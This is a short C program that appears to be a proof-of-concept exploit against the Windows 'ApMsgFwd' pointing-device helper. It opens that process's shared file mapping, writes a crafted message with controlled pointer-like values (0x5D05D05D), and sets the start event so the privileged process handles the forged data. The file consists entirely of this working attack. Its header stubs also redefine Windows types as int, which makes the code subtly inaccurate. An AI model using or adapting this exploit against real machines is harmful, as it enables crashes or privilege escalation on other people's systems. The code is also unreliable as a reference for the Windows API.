
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int* PBYTE ;
typedef int HANDLE ;
typedef int DWORD ;


 int CloseHandle (int ) ;
 int EVENT_MODIFY_STATE ;
 int FALSE ;
 int FILE_MAP_WRITE ;
 int* MapViewOfFile (int ,int ,int ,int ,int) ;
 int OpenEventA (int ,int ,char*) ;
 int OpenFileMappingA (int ,int ,char*) ;
 int SetEvent (int ) ;
 int UnmapViewOfFile (int*) ;
 int ZeroMemory (int*,int) ;
 int printf (char*) ;

int main(int argc, char** argv)
{
    HANDLE ApMpHnd,StartEvtHnd,KeyHnd;
    PBYTE MappedBuf;

    if ( ! (ApMpHnd = OpenFileMappingA(FILE_MAP_WRITE,FALSE,"ApMsgFwd File Mapping Object") ) )
    {
        printf("OpenFileMapping Failed !\n");
        goto ret;
    }

    if ( ! ( MappedBuf = MapViewOfFile(ApMpHnd,FILE_MAP_WRITE,0,0,0x1A0) ) )
    {
        printf("MapViewOfFile Failed !\n");
        goto cleanup_0;
    }

    StartEvtHnd = OpenEventA(EVENT_MODIFY_STATE,FALSE,"ApMsgFwd Event Start");

    if ( ! StartEvtHnd )
    {
        printf("OpenEvent Failed !\n");
        goto cleanup_1;
    }

    ZeroMemory(MappedBuf,0x1A0);
    *MappedBuf = 9;
    *(DWORD*)(MappedBuf + 0x60) = 0x5D05D05D;
    *(DWORD*)(MappedBuf + 0x64) = 0xD05D05D0;


    SetEvent(StartEvtHnd);

    CloseHandle(StartEvtHnd);
cleanup_1:
    UnmapViewOfFile(MappedBuf);
cleanup_0:
    CloseHandle(ApMpHnd);
ret:
    return 0;
}
